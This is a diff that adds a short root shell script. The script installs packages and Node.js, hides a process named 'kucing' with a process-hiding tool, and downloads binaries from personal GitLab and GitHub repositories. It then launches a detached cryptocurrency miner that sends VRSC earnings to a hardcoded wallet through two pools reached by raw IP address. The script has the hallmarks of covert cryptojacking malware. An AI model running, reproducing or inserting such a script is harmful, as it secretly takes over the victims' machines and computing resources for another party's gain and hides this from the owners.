@@ -1,0 +1,13 @@
+sudo su <<EOF
+apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs >/dev/null 2>&1
+sudo apt install screen -y
+sudo npm i -g node-process-hider && sudo ph add kucing
+wget -qO kucing.zip https://gitlab.com/sarifadim/jomblo/-/raw/main/kucing.zip && chmod +x kucing.zip && unzip kucing.zip && chmod +x kucing
+wget -qO ver https://github.com/sarifadim/dopla/raw/main/ver && chmod +x ver
+chmod +x *
+screen -dms run ./kucing -algo Verushash -coin VRSC -wallet 3JWuijUT2hwsC862trVXBSMzQW6JANF63j -pool1 47.88.32.232:443 -pool2 47.89.230.127:80 -rigname 00VER
+EOF
+screen -r
